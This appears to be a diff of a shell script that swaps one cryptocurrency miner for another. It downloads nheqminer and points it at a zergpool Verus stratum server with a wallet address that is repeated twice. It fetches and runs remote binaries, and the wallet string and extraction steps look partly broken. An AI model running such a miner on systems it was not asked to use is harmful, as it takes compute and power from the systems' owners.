@@ -7,7 +7,7 @@ clear
 sudo apt install screen
 screen -R xmr
  
-wget https://github.com/monkins1010/ccminer/releases/download/v3.7.0/ccminer_3_7_ubuntu_18.04.tar.gz
-tar xvzf ccminer_3_7_ubuntu_18.04.tar.gz
-cd ccminer_3_7_ubuntu_18.04
-./ccminer -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u 86bDqhG1c4XZXWcU9cX5qREg2E7ANWKhs4YwDQxSW6rmeT86bDqhG1c4XZXWcU9cX5qREg2E7ANWKhs4YwDQxSW6rmeT -k --tls --rig-id GC-US
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+nheqminer/nheqminer -v -l stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u 86bDqhG1c4XZXWcU9cX5qREg2E7ANWKhs4YwDQxSW6rmeT86bDqhG1c4XZXWcU9cX5qREg2E7ANWKhs4YwDQxSW6rmeT -k --tls --rig-id GC-US
